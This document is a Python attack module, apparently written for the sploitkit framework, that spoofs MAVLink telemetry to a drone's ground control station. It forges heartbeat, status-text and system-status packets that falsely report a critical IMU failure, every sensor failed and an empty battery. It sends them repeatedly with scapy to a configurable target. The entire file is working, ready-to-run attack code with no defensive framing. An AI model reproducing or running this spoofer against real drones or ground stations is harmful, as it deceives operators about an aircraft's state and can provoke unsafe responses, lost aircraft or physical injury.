from sploitkit import Module, Config, Option
from pymavlink import mavutil
from scapy.all import send, IP, UDP, Raw
import time
import sys

class CriticalErrorSpoofing(Module):
    """Spoof critical error messages to mislead the Ground Control Station (GCS) about the drone's status."""

    # Configuration for the spoofing module
    config = Config({
        Option(
            name='target_ip',
            description='IP of the target GCS or drone',
            required=True,
        ): "10.13.0.6",  # Default value
        Option(
            name='target_port',
            description='MavLink Port',
            required=True,
        ): "14550",  # Default value
        Option(
            name='duration',
            description='Duration of tampering in seconds',
            required=False,
        ): 10  # Default value
    })

    def create_heartbeat(self):
        """
        Create a MAVLink heartbeat message indicating a critical state.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
            system_status=mavutil.mavlink.MAV_STATE_CRITICAL  # Indicate a critical state
        )

        return heartbeat.pack(mav)

    def create_statustext(self):
        """
        Create a MAVLink STATUSTEXT message indicating a critical error.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        statustext = mav.statustext_encode(
            severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
            text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
        )

        return statustext.pack(mav)

    def create_sys_status(self):
        """
        Create a MAVLink SYS_STATUS message with critical error indicators.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        sys_status = mav.sys_status_encode(
            onboard_control_sensors_present=0b11111111111111111111111111111111,  # All sensors present
            onboard_control_sensors_enabled=0b11111111111111111111111111111111,  # All sensors enabled
            onboard_control_sensors_health=0b00000000000000000000000000000000,  # All sensors failed
            load=1000,  # System load (100%)
            voltage_battery=0,  # Battery voltage (mV)
            current_battery=0,  # Battery current (10 * mA)
            battery_remaining=0,  # Remaining battery energy (0%)
            drop_rate_comm=1000,  # Communication drop rate (% * 100)
            errors_comm=100,  # Communication errors
            errors_count1=100,  # First sensor error count
            errors_count2=100,  # Second sensor error count
            errors_count3=100,  # Third sensor error count
            errors_count4=100   # Fourth sensor error count
        )

        return sys_status.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        """
        Send a MAVLink packet using Scapy.
        """
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)

    def run(self):
        # Retrieve the target IP, port, and duration from the config
        target_ip = self.config['target_ip']
        target_port = int(self.config['target_port'])
        duration = int(self.config['duration'])

        start_time = time.time()

        # Main spoofing loop
        while True:
            # Check if the duration has been reached
            if time.time() - start_time >= duration:
                self.logger.info(f"Tampering duration of {duration} seconds reached. Stopping...")
                break

            heartbeat_packet = self.create_heartbeat()
            statustext_packet = self.create_statustext()
            sys_status_packet = self.create_sys_status()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(statustext_packet, target_ip, target_port)
            self.send_mavlink_packet(sys_status_packet, target_ip, target_port)

            self.logger.info(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")
            time.sleep(1)  # Send packets at a regular interval
